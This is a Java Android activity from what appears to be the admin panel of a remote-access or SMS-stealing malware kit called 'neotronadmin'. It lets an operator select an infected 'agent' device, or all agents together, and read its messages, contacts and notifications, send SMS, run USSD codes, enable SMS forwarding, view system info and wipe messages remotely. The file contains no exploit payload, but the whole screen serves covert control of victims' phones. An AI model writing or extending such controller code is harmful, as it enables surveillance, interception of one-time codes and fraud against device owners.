package com.pegalite.neotronadmin.ui.pages;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;

import com.pegalite.neotronadmin.BuildConfig;
import com.pegalite.neotronadmin.R;
import com.pegalite.neotronadmin.databinding.ActivityViewDeviceBinding;
import com.pegalite.neotronadmin.functions.server.req.RetrofitClient;
import com.pegalite.neotronadmin.functions.server.res.PegaCallback;
import com.pegalite.neotronadmin.functions.server.res.PegaResponseManager;
import com.pegalite.neotronadmin.functions.utils.Utils;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAnimationManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;
import com.pegalite.neotronadmin.ui.actions.ContactsActivity;
import com.pegalite.neotronadmin.ui.actions.MessagesActivity;
import com.pegalite.neotronadmin.ui.actions.NotificationsActivity;
import com.pegalite.neotronadmin.ui.actions.RunUSSDCodeActivity;
import com.pegalite.neotronadmin.ui.actions.SendMessageActivity;
import com.pegalite.neotronadmin.ui.actions.SmsForwardingActivity;
import com.pegalite.neotronadmin.ui.actions.SystemInfoActivity;
import com.pegalite.neotronadmin.ui.actions.ViewDetailsActivity;

import org.json.JSONException;
import org.json.JSONObject;

public class ViewDeviceActivity extends PegaAppCompatActivity {

    ActivityViewDeviceBinding binding;
    String agentID;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityViewDeviceBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        if (Utils.exp == null) {
            finishAffinity();
            return;
        }

        agentID = getIntent().getStringExtra("agentID");
        if (agentID == null) {
            finish();
            return;
        }

        loadConfigs();

        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.messages.setOnClickListener(v -> {
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, MessagesActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.messages.setOnLongClickListener(v -> {
            new AlertDialog.Builder(this, R.style.alertDialog).setTitle("Are You Sure?").setMessage("Do you want to delete this All Messages?").setPositiveButton("Yes", (dialog, which) -> deleteAllMessages()).setNegativeButton("No", (dialog, which) -> dialog.dismiss()).show();
            return false;
        });
        binding.contacts.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.contacts);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, ContactsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });

        binding.sendMessage.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.sendMessage);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, SendMessageActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.details.setOnClickListener(v -> {
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, ViewDetailsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.runUssdCode.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.runUssdCode);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, RunUSSDCodeActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.notifications.setOnClickListener(v -> {
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, NotificationsActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
        binding.notifications.setOnLongClickListener(v -> {
            new AlertDialog.Builder(this, R.style.alertDialog).setTitle("Are You Sure?").setMessage("Do you want to delete this All Notifications?").setPositiveButton("Yes", (dialog, which) -> deleteAllNotifications()).setNegativeButton("No", (dialog, which) -> dialog.dismiss()).show();
            return false;
        });
        binding.addSMSForwarding.setOnClickListener(v -> {
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, SmsForwardingActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });

        binding.systemInfo.setOnClickListener(v -> {
            if (agentID.equals("all")) {
                PegaAnimationManager.shake(binding.systemInfo);
                Toast.makeText(this, "This option cannot be used while controlling all agents together.", Toast.LENGTH_SHORT).show();
                return;
            }
            if (isActive(v)) {
                Toast.makeText(this, "You Don't Have Permission To Use this", Toast.LENGTH_SHORT).show();
                return;
            }
            openActivityWithRightAnim(new Intent(this, SystemInfoActivity.class).putExtra("agentID", agentID).putExtra("deviceName", deviceName));
        });
    }

    private void deleteAllMessages() {
        RetrofitClient.getInstance(this).getApiInterfaces().deleteAllMessages(agentID).enqueue(new PegaResponseManager(new PegaCallback(this, true) {
            @Override
            public void onSuccess(@Nullable JSONObject data) {
                Toast.makeText(ViewDeviceActivity.this, "All Messages Deleted Successfully!", Toast.LENGTH_SHORT).show();
            }
        }));
    }
    private void deleteAllNotifications() {
        RetrofitClient.getInstance(this).getApiInterfaces().deleteAllNotifications(agentID).enqueue(new PegaResponseManager(new PegaCallback(this, true) {
            @Override
            public void onSuccess(@Nullable JSONObject data) {
                Toast.makeText(ViewDeviceActivity.this, "All Notifications Deleted Successfully!", Toast.LENGTH_SHORT).show();
            }
        }));
    }

    private boolean isActive(View v) {
        String title = ((TextView) ((LinearLayout) v).getChildAt(1)).getText().toString();
        if (title.contains("Forwarding")) {
            title = "SMS Forwarding";
        }
        return !configs.optBoolean(title, BuildConfig.DEBUG);
    }

    JSONObject configs;

    private void loadConfigs() {
        try {
            configs = new JSONObject(Utils.ADMIN_CONFIGS);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
}